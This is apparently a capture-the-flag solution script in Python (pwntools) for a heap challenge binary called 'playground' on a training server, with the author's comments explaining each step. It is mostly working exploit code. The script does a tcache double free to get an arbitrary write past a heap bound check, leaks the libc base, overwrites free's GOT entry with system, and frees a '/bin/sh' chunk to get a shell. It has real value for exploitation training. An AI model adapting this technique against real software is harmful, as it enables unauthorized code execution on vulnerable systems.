from pwn import *
from sys import *

SERVER = "bin.training.offdef.it"
PORT = "4110"
BINARY = "./playground"


if "--remote" in sys.argv:
	r = remote(SERVER, PORT)
else:
	r = process(BINARY)

if "--debug" in sys.argv: 
	gdb.attach(r, """
		#breakpoints
		#b fwrite
		c
		""")


#code
def malloc(size):
	r.sendline(b"malloc %d" % size)
	sleep(timesleep)
	r.recvuntil(b"==> ")
	x = int(r.recvuntil(b">")[:-len("\n>")], 16)
	print("[!] malloc of %d: %#x" % (size, x))
	return x


def free(addr):
	r.sendline(b"free %#x" % addr)
	sleep(timesleep)
	r.recvuntil(b"==> ")
	x = r.recvuntil(b">")[:-len("\n>")]
	if x == b"ok":
		print("[!] free %#x done" %addr)

def write(addr, str):
	print("[!] write in %#x %s" % (addr,str))
	r.sendline(b"write %#x %d" % (addr,len(str)))
	sleep(timesleep)
	r.recvuntil(b"read\n")
	sleep(timesleep)
	r.send(str)
	sleep(timesleep)
	r.recvuntil(b"done\n")
	r.recvuntil(b">")

def show(addr, num_items):
	r.sendline(b"show %#x %d" % (addr,num_items))
	sleep(timesleep)
	r.recv()
	data = []
	for i in range(num_items):
		x = r.recvline()
		x = x.split(b":")
		x[0]= int(x[0],16)
		data.append(x)
	r.recvuntil(b">")
	return data; 


#global
timesleep = 0.1
libc= ELF("./libc-2.27.so")

#retrive first data
r.recvuntil(b"pid: ")
pid=int(r.recvuntil(b"main: ")[:-len("\nmain:")],10)
print("[!] pid: %d" %pid)

main_addr = int(r.recvuntil(b">")[:-len("\n>")], 16)
print("[!] main: %#x" %main_addr)

#reset min-heap to 0
max_heap_addr = main_addr+0x2ec7
print("[!] Leaked max_heap addr: %#x" % max_heap_addr)
x=malloc(0x60)
free(x)
write(x, b"A"*10)
free(x)
write(x,p64(max_heap_addr))
malloc(0x60)
malloc(0x60)

'''
To resolve this challenge the goal was to understand that the check made before the "write" was the one
preventing us to actually write everywhere we want in the memory. So, at the beginnig, the plan was to 
override the "max_heap" and the "min_heap" to unlock all the memory addresses. Then I found out just the
min_heap was enough. To achive this goal, I did a double free on a t-cache chunk (very similar to the beginnig 
of a fast_bin attack) in order to decide where I wanted the malicious malloc (in order to do it, it was
necessary to write somenthing after the first free for preventing the program to have a "double free" error). 
Then, because the malloc in the t-cache doesn't check any metadata, I can do the malloc exactly at the addr
of the min_heap (max_heap_addr). There is a version of the libc (ours) in which the malloc actually prints
8 bytes of zeros at the beginning of the malloc. So basically by doing the malloc I reset the min_heap to 0x0, 
unlocking all the addresses below the old min_heap.  
'''

#leaking libc
offset_libc = 0x3ebca0
x= malloc(0x730)
malloc(0x520)
free(x)
mem = show(x,1)
leak_libc = int(mem[0][1],16)- offset_libc
print("[!] Leaked libc: %#x" % leak_libc)
libc.address = leak_libc

'''
Here I simply leaked the libc by using the usual technique (fast-bin attack beginning). The only difference 
was that I had to be sure the chucks didn't finish in the t-cache, so I had to allocate 2 different size 
chunks both larger than 0x500
'''

#rewrite got function
malloc_got_addr = max_heap_addr-0x50
fprintf_got_addr = max_heap_addr-0x38
strcmp_got_addr = max_heap_addr -0x60
puts_got_addr = max_heap_addr -0x80
free_got_addr = max_heap_addr - 0x88

onegadget = libc.address+0x4f2a5

#onegadget list
#0x4f2a5 
#0x4f302
#0x10a2fc

'''
At this point my plan was to run a onegadget overriding the address of one of the function available in the
got, but none of them worked
'''

#calling system("/bin/sh")
system_libc_addr = libc.symbols["system"]

write(free_got_addr, p64(system_libc_addr))
x = malloc(0x50)
write(x, b"/bin/sh\x00")
r.sendline(b"free " + str(x).encode())
print("[!] bin/sh executed")

r.interactive()

'''
In the final part I decided to call the system with the bin/sh, so I got the system addr with the symbols
function, I overrided the free_got_addr with the system function and I allocated the bin/sh string in one 
chunk. Then, by calling the free on the chunk, the shell poped out
'''